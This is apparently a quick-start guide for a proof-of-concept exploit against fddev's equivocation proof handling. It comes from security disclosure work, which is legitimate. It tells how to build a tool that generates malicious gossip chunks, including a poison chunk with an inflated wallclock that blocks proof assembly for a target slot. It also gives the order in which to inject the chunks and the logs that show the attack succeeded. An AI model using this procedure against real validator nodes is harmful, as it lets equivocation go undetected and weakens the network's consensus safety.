# CONSENSUS-002 PoC Quick Start

## What This PoC Does

Generates malicious gossip chunks that demonstrate the equivocation proof censorship vulnerability. When injected into fddev, these chunks will poison the proof assembly mechanism for slot 200, while allowing normal processing for slots 100 and 300.

## Quick Build & Run

```bash
# From the PoC directory
cargo build --release

# Generate attack payloads
./target/release/consensus-002-poc
```

This creates `./output/` with:
- `slot100_chunk*.bin` - Normal proof chunks (will assemble and fail validation)
- `slot200_poison.bin` - Malicious chunk with wallclock=999999999999999
- `slot200_chunk*.bin` - Legitimate chunks (will be rejected due to poison)
- `slot300_chunk*.bin` - Normal proof chunks (will assemble and fail validation)

## Testing Approach

The PoC **generates the attack payloads** but does not automatically inject them into fddev due to gossip protocol complexity. See [MANUAL_TESTING.md](MANUAL_TESTING.md) for detailed guidance on completing the demonstration.

### Simplified Approach (Recommended)

If you have access to fddev source:

1. Add a test injection function to `src/choreo/eqvoc/fd_eqvoc.c`:

```c
#ifdef FD_EQVOC_TEST_MODE
void fd_eqvoc_test_inject_chunk_file( fd_eqvoc_t * eqvoc, char const * path ) {
  // Read chunk file and call fd_eqvoc_proof_chunk_insert
  // See MANUAL_TESTING.md for full implementation
}
#endif
```

2. Compile fddev with `-DFD_EQVOC_TEST_MODE`

3. Inject chunks in sequence:
```bash
# Slot 100 (normal)
fdctl eqvoc-test inject output/slot100_chunk0.bin
fdctl eqvoc-test inject output/slot100_chunk1.bin
fdctl eqvoc-test inject output/slot100_chunk2.bin

# Slot 200 (poison FIRST, then legitimate)
fdctl eqvoc-test inject output/slot200_poison.bin
fdctl eqvoc-test inject output/slot200_chunk0.bin
fdctl eqvoc-test inject output/slot200_chunk1.bin
fdctl eqvoc-test inject output/slot200_chunk2.bin

# Slot 300 (normal)
fdctl eqvoc-test inject output/slot300_chunk0.bin
fdctl eqvoc-test inject output/slot300_chunk1.bin
fdctl eqvoc-test inject output/slot300_chunk2.bin
```

4. Analyze logs:
```bash
cargo run --release -- --analyze-logs /path/to/fddev.log
```

## Expected Results

The log analysis tool will show:

```
Slot 100: Analysis
--------------------------------------------------------------------------------
  Found 5 relevant log lines:
    [1] [eqvoc] received chunk (slot: 100, ...)
    [2] [eqvoc] received chunk (slot: 100, ...)
    [3] [eqvoc] received chunk (slot: 100, ...)
    [4] [eqvoc] proof complete for slot 100, verifying...
    [5] [ERROR] proof verification failed: invalid signature

  ✅ Normal behavior: Chunks assembled, validation attempted (failed as expected)

Slot 200: Analysis
--------------------------------------------------------------------------------
  Found 4 relevant log lines:
    [1] [eqvoc] received chunk (slot: 200, ...) wallclock=999999999999999
    [2] [WARNING] received newer chunk. overwriting.
    [3] [eqvoc] received chunk (slot: 200, ...) wallclock=1700000000000
    [4] [WARNING] received older chunk. ignoring.
    [... more "older chunk" warnings ...]

  ❌ NO "proof complete" message
  ❌ NO verification attempt

  ✅ ATTACK SUCCESSFUL:
     - Poison chunk accepted
     - Legitimate chunks rejected
     - Proof never assembled
     - No verification attempted

Slot 300: Analysis
--------------------------------------------------------------------------------
  Found 5 relevant log lines:
    [1] [eqvoc] received chunk (slot: 300, ...)
    [2] [eqvoc] received chunk (slot: 300, ...)
    [3] [eqvoc] received chunk (slot: 300, ...)
    [4] [eqvoc] proof complete for slot 300, verifying...
    [5] [ERROR] proof verification failed: invalid signature

  ✅ Normal behavior: Chunks assembled, validation attempted (failed as expected)
```

## Key Evidence

The **absence** of validation for slot 200 proves the vulnerability. The wallclock poisoning prevents proof assembly, which is the attack goal - equivocation goes undetected because the proof never reaches validation.

## Troubleshooting

- **No logs**: Ensure fddev is running with `--log-level 3`
- **All slots validate**: Check chunk injection sequence (poison must be first for slot 200)
- **Cannot inject**: See [MANUAL_TESTING.md](MANUAL_TESTING.md) for alternative approaches

## Files

- `README.md` - Full documentation
- `MANUAL_TESTING.md` - Detailed testing strategies
- `QUICKSTART.md` - This file
- `src/main.rs` - Payload generation tool
- `submit_chunks.sh` - Helper script (demonstrates sequence)
